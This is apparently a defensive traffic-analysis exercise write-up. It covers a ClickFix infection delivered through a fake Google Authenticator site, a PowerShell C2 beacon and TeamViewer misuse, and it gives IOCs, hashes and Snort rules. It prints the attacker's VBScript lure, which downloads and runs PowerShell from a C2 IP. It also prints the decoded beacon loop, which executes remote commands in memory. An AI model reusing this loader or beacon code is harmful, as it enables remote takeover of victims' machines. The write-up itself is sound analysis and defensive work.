# 2025-01-22 — ClickFix Lure → PowerShell C2 Beacon → TeamViewer RAT

---

## Overview

| Field | Value |
|-------|-------|
| Platform | Traffic Analysis Exercise |
| Category | Network Analysis |
| Tools Used | Wireshark, tcpdump, CyberChef |
| Date | 2025-01-22 |
| Victim IP | 10.1.17.215 |
| Victim Hostname | DESKTOP-L8C5GSJ |
| Victim MAC | 00:d0:b7:26:4a:74 |
| Victim User | shutchenson |
| Fake Site | authenticatoor.org |
| C2 Server | 5.252.153.241, 45.125.66.32, 45.125.66.252 |

---

## Background Notes

### ClickFix
- ClickFix is a social engineering technique that gained popularity in 2024.
- The attacker tricks the victim into running a malicious script — usually via fake pages impersonating legitimate services (Microsoft Teams, Azure).
- In this case, a VBScript file opened the real Microsoft website to deceive the victim, while silently executing malicious code in the background.

### PowerShell C2 Beacon
- Malicious PowerShell script (.ps1) obfuscated with Base64 and junk characters (`;`, `}`, `>`).
- Uses fileless malware technique — payload executed via `iex` (Invoke-Expression) directly in RAM without writing to disk.
- Beacons every 5 seconds to the C2 server and executes received commands.
- Identifies the victim machine using the C: drive serial number in the URL.
- MITRE ATT&CK: T1059.001 (PowerShell), T1071.001 (Web Protocols), T1105 (Ingress Tool Transfer)

### TeamViewer RAT
- TeamViewer is legitimate remote desktop software.
- Attackers use it as a RAT (Remote Access Trojan) — gives full remote access to the infected machine.
- TeamViewer traffic runs over port 443 (TLS) making it difficult to block at the firewall.

---

## Scenario

PCAP analysis from January 22, 2025. Shortly after booting and receiving a DHCP lease, machine `10.1.17.215` (user: **shutchenson**, hostname: **DESKTOP-L8C5GSJ**) established suspicious connections to external IPs over unencrypted HTTP (port 80). The user had searched for "Google Authenticator" and was redirected through a malicious Google ad to `authenticatoor.org` — a typosquatted fake download page. The goal of the analysis was to identify the attack vector, downloaded files, and post-infection malware behavior.

---

## Analysis

### 1. Initial Triage

**PCAP Statistics:**

```
File:         2025-01-22-traffic-analysis-exercise.pcap
Packets:      39,427
Duration:     53 minutes (19:44:56 – 20:38:18 UTC)
First packet: 2025-01-22 19:44:56
Last packet:  2025-01-22 20:38:18
```

**Protocol Hierarchy:**
- TCP (dominant)
- HTTP (port 80) — unencrypted, suspicious in 2025
- TLS (port 443) — TeamViewer traffic
- UDP — DNS, DHCP, NBNS

**Conversations** (Statistics → Conversations → IPv4, sort by Bytes):

```
10.1.17.215  →  5.252.153.241   — high traffic, HTTP port 80   ← SUSPICIOUS (C2 + payload server)
10.1.17.215  →  45.125.66.32    — high traffic, TLS port 443   ← SUSPICIOUS (TeamViewer C2)
10.1.17.215  →  45.125.66.252   — high traffic, TLS port 443   ← SUSPICIOUS (TeamViewer C2)
10.1.17.215  →  82.221.136.26   — TLS port 443                 ← TeamViewer relay
10.1.17.215  →  10.1.17.2       — DNS, LDAP (internal)
```

---

### 2. Key Findings

#### Finding 1 — ClickFix Lure Download (VBScript)

The user visited `authenticatoor.org` (typosquatted fake Google Authenticator site) which delivered the ClickFix payload.

**Filter used:** `http.request and ip.dst == 5.252.153.241`

**Evidence:**
- Frame: 5031
- Timestamp: 2025-01-22 19:45:56 UTC
- Source: 10.1.17.215:50143 → Destination: 5.252.153.241:80
- Request: `GET /api/file/get-file/264872 HTTP/1.1`
- File type: HTML document with VBScript (ClickFix lure)

File `264872` opened the real `azure.microsoft.com` as a decoy to distract the victim, while silently running a malicious PowerShell script in the background:

```vbscript
Set objShell = CreateObject("Wscript.Shell")
objShell.Run("cmd /c start /min powershell -NoProfile -WindowStyle Hidden -Command
  ""start-process 'https://azure.microsoft.com';
  iex (new-object System.Net.WebClient).'DownloadString'
  ('http://5.252.153.241:80/api/file/get-file/29842.ps1')""")
```

---

#### Finding 2 — PowerShell C2 Beacon Download (29842.ps1)

**Filter used:** `http.request`

**Evidence:**
- Timestamp: 2025-01-22 19:45:56 UTC
- Request: `GET /api/file/get-file/29842.ps1 HTTP/1.1`
- Source: 10.1.17.215 → 5.252.153.241:80
- Obfuscation: Base64 + junk characters (`;`, `}`, `>`) + iex (fileless execution)

---

#### Finding 3 — Second C2 Beacon Download (pas.ps1)

**Filter used:** `http.request`

**Evidence:**
- Frame: 13671
- Timestamp: 2025-01-22 19:47:05 UTC
- Request: `GET /api/file/get-file/pas.ps1 HTTP/1.1`
- Source: 10.1.17.215 → 5.252.153.241:80
- Identical payload to 29842.ps1 — two copies of the same beacon

**Decoded payload** (CyberChef: Find/Replace `};>` → From Base64):

```powershell
$fso = New-Object -Com "Scripting.FileSystemObject"
$SerialNumber = $fso.GetDrive("c:\").SerialNumber
$ip = 'http://5.252.153.241/'
$url = $ip + $serial          # unique URL per machine (disk serial number)
$s = New-Object System.Net.WebClient
while ($true) {               # infinite loop
    $result = $s.DownloadString($url)
    Invoke-Expression $result # executes commands from C2 directly in RAM
    Start-Sleep -s 5          # every 5 seconds
}
```

---

#### Finding 4 — C2 Beaconing (every 5 seconds)

**Filter used:** `ip.addr == 5.252.153.241 and http.request`

**Evidence:**
- Pattern: `GET /<serial_number> HTTP/1.1` every ~5 seconds throughout the recording
- Host: 5.252.153.241
- C: drive serial number in the URL identifies the specific machine on the C2 side

---

#### Finding 5 — TeamViewer RAT

**Filter used:** `ip.addr == 82.221.136.26`

**Evidence:**
- Source: 10.1.17.215 → Destination: 82.221.136.26:443
- Protocol: TLS (encrypted — hides remote desktop traffic)
- Port 443 used intentionally to look like normal HTTPS and avoid firewall blocks

---

### 3. Timeline

| Time (UTC) | Frame | Event |
|-----------|-------|-------|
| 19:44:56 | 1 | Machine boots — DHCP, gets IP 10.1.17.215 |
| 19:45:56 | 5031 | Downloads ClickFix lure: `GET /api/file/get-file/264872` |
| 19:45:56 | ~5032 | VBScript launches 29842.ps1 — C2 beacon starts |
| 19:47:05 | 13671 | Downloads second beacon: `GET /api/file/get-file/pas.ps1` |
| 19:47:10+ | — | Beacon every 5s: `GET /1517096937` → awaiting commands |
| Throughout | — | TeamViewer traffic to 82.221.136.26:443 |

---

## Extracted Artifacts

**Files Extracted** (File → Export Objects → HTTP):

```
264872:    HTML document, ASCII text, with CRLF line terminators

SHA256 pas.ps1:
a833f27c2bb4cad31344e70386c44b5c221f031d7cd2f2a6b8601919e790161e

SHA256 29842.ps1:
b8ce40900788ea26b9e4c9af7efab533e8d39ed1370da09b93fcf72a16750ded

SHA256 TeamViewer:
904280f20d697d876ab90a1b74c0f22a83b859e8b0519cb411fda26f1642f53e

TeamViewer: PE32 executable (GUI) Intel 80386, for MS Windows
```

---

## Indicators of Compromise (IOCs)

### Network IOCs

```
# Malicious Domain
authenticatoor.org     — fake Google Authenticator download site (typosquat)

# Malicious IPs
5.252.153.241          — C2 + payload server (HTTP port 80)
45.125.66.32           — TeamViewer C2 (TLS port 443)
45.125.66.252          — TeamViewer C2 (TLS port 443)
82.221.136.26          — TeamViewer relay (TLS port 443)

# Malicious URLs
hxxp://5.252.153.241/api/file/get-file/264872
hxxp://5.252.153.241/api/file/get-file/29842.ps1
hxxp://5.252.153.241/api/file/get-file/pas.ps1
hxxp://5.252.153.241/<serial_number>   (C2 beacon pattern — C: drive serial)
```

### File IOCs

```
# SHA256 Hashes
c74123dbccded43fda61651e102750b041d4c3af6fda88cd6436f9276653e103  264872       (ClickFix HTML/VBScript lure)
b8ce40900788ea26b9e4c9af7efab533e8d39ed1370da09b93fcf72a16750ded  29842.ps1    (obfuscated PowerShell loader — stage 1)
a833f27c2bb4cad31344e70386c44b5c221f031d7cd2f2a6b8601919e790161e  pas.ps1      (obfuscated PowerShell loader — stage 2)
904280f20d697d876ab90a1b74c0f22a83b859e8b0519cb411fda26f1642f53e  TeamViewer   (PE32 remote access binary)
```

---

## Snort Rules

```
# Detects malicious file downloads
alert tcp any any -> 5.252.153.241 80 (msg:"Suspicious file download from C2"; flow:to_server,established; content:"GET /api/file/get-file/"; sid:1000002; rev:1;)

# Detects C2 beaconing
alert tcp any any -> 5.252.153.241 80 (msg:"C2 Beacon Detection"; flow:to_server,established; content:"Host: 5.252.153.241"; sid:1000003; rev:1;)
```

---

## MITRE ATT&CK

| ID | Technique |
|----|-----------|
| T1036 | Masquerading (ClickFix impersonating Microsoft) |
| T1059.001 | PowerShell |
| T1071.001 | Web Protocols (HTTP C2) |
| T1105 | Ingress Tool Transfer |
| T1027 | Obfuscated Files or Information |
| T1140 | Deobfuscate/Decode Files |
| T1219 | Remote Access Software (TeamViewer) |

---

**Tags:** #network-analysis #pcap #clickfix #c2-beacon #powershell #teamviewer #rat #ioc #wireshark
